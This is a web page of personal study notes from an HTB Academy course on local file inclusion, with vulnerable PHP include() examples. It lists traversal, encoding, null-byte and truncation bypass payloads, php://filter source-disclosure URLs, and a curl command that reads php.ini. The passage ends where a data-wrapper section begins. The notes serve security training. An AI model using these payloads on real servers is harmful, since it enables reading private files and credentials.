<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Hacking/HTB Academy/File inclusion" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">File inclusion | agalera.eu</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://www.agalera.eu/docs/Hacking/HTB Academy/File inclusion"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="File inclusion | agalera.eu"><meta data-rh="true" name="description" content="To reduce the amount of code required, sometimes the page or section to render is passed with a parameter. If this feature is not properly secured an attacker can use this parameter to display the content of any file."><meta data-rh="true" property="og:description" content="To reduce the amount of code required, sometimes the page or section to render is passed with a parameter. If this feature is not properly secured an attacker can use this parameter to display the content of any file."><link data-rh="true" rel="canonical" href="https://www.agalera.eu/docs/Hacking/HTB Academy/File inclusion"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/Hacking/HTB Academy/File inclusion" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/Hacking/HTB Academy/File inclusion" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"File inclusion","item":"https://www.agalera.eu/docs/Hacking/HTB Academy/File inclusion"}]}</script><link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-S8VGYBN25C"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-S8VGYBN25C",{anonymize_ip:!0})</script><link rel="stylesheet" href="/docs/assets/css/styles.f96ca0f1.css">
<script src="/docs/assets/js/runtime~main.44ba144b.js" defer="defer"></script>
<script src="/docs/assets/js/main.3333a616.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><a class="navbar__brand" href="/docs/"><div class="navbar__logo"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">agalera.eu</b></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search"><span aria-label="expand searchbar" role="button" class="search-icon" tabindex="0"></span><input id="search_input_react" type="search" placeholder="Loading..." aria-label="Search" class="navbar__search-input search-bar" disabled=""></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/flight-sim/dcs/f5e">Flight Simulators</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/Hacking/HTB Academy/File inclusion">Hacking</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/Hacking/HTB Academy/File inclusion">HTB Academy</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Hacking/HTB Academy/File inclusion">File inclusion</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/File transfers">File transfer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Linux fundamentals">Linux fundamentals</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/languages/bash">Language security</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/playbooks/active-directory">Playbooks</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/tooling/crackmapexec">Tooling</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/useful-links">Useful links</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/write-up/htb-academy/file-inclusion">Write-ups</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/linux-useful-commands">Linux</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Shortcuts/Chrome">Shortcuts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/">Welcome</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/docs/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Hacking</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HTB Academy</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">File inclusion</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>File inclusion</h1></header>
<p>To reduce the amount of code required, sometimes the page or section to render is passed with a parameter. If this feature is not properly secured an attacker can use this parameter to display the content of any file.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="local-file-inclusion">Local file inclusion<a href="#local-file-inclusion" class="hash-link" aria-label="Direct link to Local file inclusion" title="Direct link to Local file inclusion">​</a></h2>
<p>This vulnerability happens typically on templating engines. For example:</p>
<p><code>/index.php?page=about</code> and <code>about</code> is a PHP file in the same directory.</p>
<p>File Inclusion vulnerabilities may occur in any web server and any development frameworks, as all of them provide functionalities for loading dynamic content and handling front-end templates.</p>
<p>The most important thing to keep in mind is that some of the above functions only read the content of the specified files, while others also execute the specified files. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server.</p>
<p>The following table shows which functions may execute files and which only read file content:</p>
<p><img decoding="async" loading="lazy" src="/docs/assets/images/lfi-84d379217c79c75fb37157fb28e3812a.png" width="1013" height="836" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-lfi">Basic LFI<a href="#basic-lfi" class="hash-link" aria-label="Direct link to Basic LFI" title="Direct link to Basic LFI">​</a></h3>
<p>One example of basic LFI, can be <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=es.php</code>. In a webpage, when we change the language, another file is read (<code>es.php</code>).</p>
<p>Two common readable files that are available on most back-end servers are <code>/etc/passwd</code> on Linux and <code>C:\Windows\boot.ini</code> on Windows. So, let&#x27;s change the parameter from es to /etc/passwd: <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/etc/passwd</code> and we retrieve the <code>/etc/passwd</code> file contents.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="path-traversal">Path traversal<a href="#path-traversal" class="hash-link" aria-label="Direct link to Path traversal" title="Direct link to Path traversal">​</a></h3>
<p>There might be cases where the file inclusion is &quot;restricted&quot; to some folder:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">include</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string double-quoted-string" style="color:#e3116c">&quot;./languages/&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">.</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$_GET</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;language&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>The languages are loaded from the <code>languages</code> folder. In this case, if we visit the URL in the previous section, it will not work because it will try to read the file in <code>./languages/etc/password</code>.</p>
<p>We can easily bypass this restriction using <code>relative paths</code>. We can add <code>../</code> to visit the parent directory. So, we can use this trick to go back several directories until we reach the root path (i.e. /), and then specify our absolute file path (e.g. ../../../../etc/passwd), and the file should exist:</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/passwd</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="filename-prefix">Filename prefix<a href="#filename-prefix" class="hash-link" aria-label="Direct link to Filename prefix" title="Direct link to Filename prefix">​</a></h3>
<p>On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">include</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string double-quoted-string" style="color:#e3116c">&quot;lang_&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">.</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$_GET</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;language&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>In this case, if we try to traverse the directory with ../../../etc/passwd, the final string would be lang_../../../etc/passwd, which is invalid.</p>
<p>instead of directly using path traversal, we can prefix a <code>/</code> before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories.</p>
<p>This may not always work, as in this example a directory named lang_/ may not exist, so our relative path may not be correct.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="appended-extensions">Appended extensions<a href="#appended-extensions" class="hash-link" aria-label="Direct link to Appended extensions" title="Direct link to Appended extensions">​</a></h3>
<p>Sometimes, the extension of the file is included in the backend code:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">include</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$_GET</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;language&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">.</span><span class="token plain"> </span><span class="token string double-quoted-string" style="color:#e3116c">&quot;.php&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>if we try to read /etc/passwd, then the file included would be /etc/passwd.php, which does not exist.</p>
<p>The bypass for this will be discussed in future sections.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="second-order-attacks">Second order attacks<a href="#second-order-attacks" class="hash-link" aria-label="Direct link to Second order attacks" title="Direct link to Second order attacks">​</a></h3>
<p>This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.</p>
<p>For example, a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png). If we craft a malicious LFI username (e.g. ../../../etc/passwd), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="basic-bypass">Basic bypass<a href="#basic-bypass" class="hash-link" aria-label="Direct link to Basic bypass" title="Direct link to Basic bypass">​</a></h2>
<p>The developers usually put some mechanism to protect user inputs. However, most of them can be bypassed.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="search-and-replace-filter">Search and replace filter<a href="#search-and-replace-filter" class="hash-link" aria-label="Direct link to Search and replace filter" title="Direct link to Search and replace filter">​</a></h3>
<p>Detect and deletes substrings of <code>../</code>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa">$language</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">str_replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;../&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$_GET</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;language&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>In this case, it does not replace recursively, it will only replace the first entry of <code>../</code>. So, <code>....//</code> would become <code>../</code> and this way we can retrieve the file.</p>
<p>There are other ways of bypassing the search replace, we may use ..././ or ..../ and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. ..../), or adding extra forward slashes (e.g. ....////)</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="encoding">Encoding<a href="#encoding" class="hash-link" aria-label="Direct link to Encoding" title="Direct link to Encoding">​</a></h3>
<p>Sometimes, when the payload is URL encoded and the check is implemented poorly, the limitation will be bypassed. For example:</p>
<p>If the target web application did not allow <code>.</code> and <code>/</code> in our input, we can URL encode <code>../</code> into <code>%2e%2e%2f</code>, which may bypass the filter.</p>
<p>Sometimes double URL encode might help bypassing the filter.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="approved-paths">Approved paths<a href="#approved-paths" class="hash-link" aria-label="Direct link to Approved paths" title="Direct link to Approved paths">​</a></h3>
<p>Sometimes, the application restrict the user input to make sure if lands in an approved path, e.g.</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">preg_match</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;/^\.\/languages\/.+$/&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$_GET</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;language&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">include</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$_GET</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;language&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">echo</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;Illegal path specified!&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>To bypass this, we may use path traversal and start our payload with the approved path, and then use ../ to go back to the root directory and read the file we specify, as follows: <code>&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./languages/../../../../etc/passwd</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="approved-extension">Approved extension<a href="#approved-extension" class="hash-link" aria-label="Direct link to Approved extension" title="Direct link to Approved extension">​</a></h3>
<p>With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful e.g. for reading source code.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="path-truncation">Path Truncation<a href="#path-truncation" class="hash-link" aria-label="Direct link to Path Truncation" title="Direct link to Path Truncation">​</a></h4>
<p>In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /. would also be truncated, and PHP would call (/etc/passwd). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd).</p>
<p>If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (.php) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.</p>
<p>we should calculate the full length of the string to ensure only .php gets truncated</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="null-bytes">Null bytes<a href="#null-bytes" class="hash-link" aria-label="Direct link to Null bytes" title="Direct link to Null bytes">​</a></h4>
<p>Adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it.</p>
<p>To exploit this vulnerability, we can end our payload with a null byte (e.g. <code>/etc/passwd%00</code>), such that the final path passed to include() would be (<code>/etc/passwd%00.php</code>). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="php-filters">PHP Filters<a href="#php-filters" class="hash-link" aria-label="Direct link to PHP Filters" title="Direct link to PHP Filters">​</a></h2>
<p>PHP has a built-in feature named <code>PHP Wrappers</code>. They allow developers to access different I/O stream at application level, such as stdin, stdout, etc...</p>
<p><code>PHP filters</code> are a special type of PHP wrappers to pass different types of input and have it filtered. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the <code>convert.base64-encode</code> filter, under Conversion Filters.</p>
<p>The first step is to use <code>fuff</code> to enumerate PHP files. Normally in php LFI inclusion, the PHP gets executed and the source code cannot be seen.</p>
<p>For example:</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=config</code> will execute the <code>config.php</code> file and we&#x27;ll not see anything in the website.</p>
<p>However, we can leverage php filter to transform the file to base64:</p>
<p><code>php://filter/read=convert.base64-encode/resource=config</code>:</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></p>
<p>Later, we can transform the source code using <code>base64 -d</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;PD9waHAK...SNIP...KICB9Ciov&#x27; | base64 -d</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="php-wrappers">PHP Wrappers<a href="#php-wrappers" class="hash-link" aria-label="Direct link to PHP Wrappers" title="Direct link to PHP Wrappers">​</a></h2>
<p>There are other PHP wrappers that would be extremely useful.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="data-wrapper">Data wrapper<a href="#data-wrapper" class="hash-link" aria-label="Direct link to Data wrapper" title="Direct link to Data wrapper">​</a></h3>
<p>The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the <code>allow_url_include</code> setting is enabled in the PHP configurations.</p>
<p>First we need to check if that flag is enabled or not. In order to do so, we&#x27;ll use <code>base64</code> wrapper to retrieve the files in:</p>
<p><code>/etc/php/X.Y/apache2/php.ini</code> for Apache or,
<code>/etc/php/X.Y/fpm/php.ini</code> for nginx.</p>
<p>If we don&#x27;t know exactly the PHP version, we can try all of them.</p>
<p>For example:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;</span><br></span></code></pre></div></div>
<p>Now, we can pass the PHP code we want to execute encoded in base64 to the <code>data</code> wrapper:</p>
